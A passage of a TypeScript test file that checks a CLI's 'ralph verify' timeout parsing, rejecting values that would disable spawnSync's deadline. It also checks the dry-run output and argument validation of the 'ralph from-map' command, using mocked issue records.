      lockSpy.mockRestore();
      logSpy.mockRestore();
      errorSpy.mockRestore();
    }
  });
});

describe('ralph verify timeout resolution', () => {
  afterEach(() => {
    delete process.env.OMC_RALPH_VERIFY_TIMEOUT_SECONDS;
  });

  it('defaults to ten minutes and reads the environment override', () => {
    expect(resolveFeedbackTimeoutMs()).toBe(DEFAULT_FEEDBACK_TIMEOUT_MS);
    process.env.OMC_RALPH_VERIFY_TIMEOUT_SECONDS = '1800';
    expect(resolveFeedbackTimeoutMs()).toBe(1_800_000);
    expect(resolveFeedbackTimeoutMs('90')).toBe(90_000);
  });

  it.each(['0', '-5', 'abc', '0.0001', 'NaN'])('rejects %s instead of passing it to spawnSync', (value) => {
    // spawnSync treats 0 as "no deadline"; a budget that rounds to zero would
    // let a hung suite hold the session lock forever.
    expect(resolveFeedbackTimeoutMs(value)).toBeNull();
  });

  it('rejects a CLI --timeout that rounds to zero', async () => {
    const errorSpy = vi.spyOn(console, 'error').mockImplementation(() => {});
    try {
      const program = new Command();
      program.exitOverride();
      ralphCommand(program);
      await program.parseAsync(['ralph', 'verify', '--timeout', '0.0001'], { from: 'user' });
      expect(process.exitCode).toBe(1);
      expect(errorSpy.mock.calls.flat().join('\n')).toContain('--timeout must be a positive number of seconds');
    } finally {
      process.exitCode = undefined;
      errorSpy.mockRestore();
    }
  });
});

describe('omc ralph from-map command', () => {
  it('prints the frontier plan without spawning anything (dry-run surface)', async () => {
    ingestMock.loadMapRecords.mockReturnValueOnce([
      { number: 46, state: 'OPEN', labels: ['wayfinder:map'], assignees: 0, body: '' },
      { number: 70, state: 'OPEN', labels: ['wayfinder:research'], assignees: 0, nativeParent: 46, body: '## Parent\n\n[o/r#46](https://github.com/o/r/issues/46)\n\n## Acceptance criteria\n\n- [ ] x' },
      { number: 72, state: 'OPEN', labels: ['wayfinder:grilling'], assignees: 0, nativeParent: 46, body: '## Parent\n\n[o/r#46](https://github.com/o/r/issues/46)\n\nq' },
    ] as never);
    const logs: string[] = [];
    const spy = vi.spyOn(console, 'log').mockImplementation((...args: unknown[]) => { logs.push(args.map(String).join(' ')); });
    try {
      const program = new Command();
      program.exitOverride();
      ralphCommand(program);
      await program.parseAsync(['ralph', 'from-map', '--map', 'o/r#46'], { from: 'user' });
    } finally {
      spy.mockRestore();
    }
    const out = logs.join('\n');
    expect(out).toContain('dry run, nothing written');
    expect(out).toContain('#70 — ingest-with-criteria');
    expect(out).toContain('#72 — routes to human');
    expect(ingestMock.loadMapRecords).toHaveBeenCalledWith({ repo: 'o/r', number: 46 });
    // Nothing was launched: the dry-run surface never spawns.
    expect(spawnMock.defaultSpawnFn).not.toHaveBeenCalled();
  });

  it('refuses a missing or unparseable --map with a non-zero exit', async () => {
    const errors: string[] = [];
    const spy = vi.spyOn(console, 'error').mockImplementation((...args: unknown[]) => { errors.push(args.map(String).join(' ')); });
    const previous = process.exitCode;
    try {
      const program = new Command();
      program.exitOverride();
      ralphCommand(program);
      await program.parseAsync(['ralph', 'from-map'], { from: 'user' });
      expect(process.exitCode).toBe(1);
      process.exitCode = 0;
      await program.parseAsync(['ralph', 'from-map', '--map', 'garbage'], { from: 'user' });
      expect(process.exitCode).toBe(1);
    } finally {
      process.exitCode = previous;
      spy.mockRestore();
    }
    expect(errors.join('\n')).toContain('--map <repo#number> is required');
    expect(errors.join('\n')).toContain('could not parse map reference');
  });
});
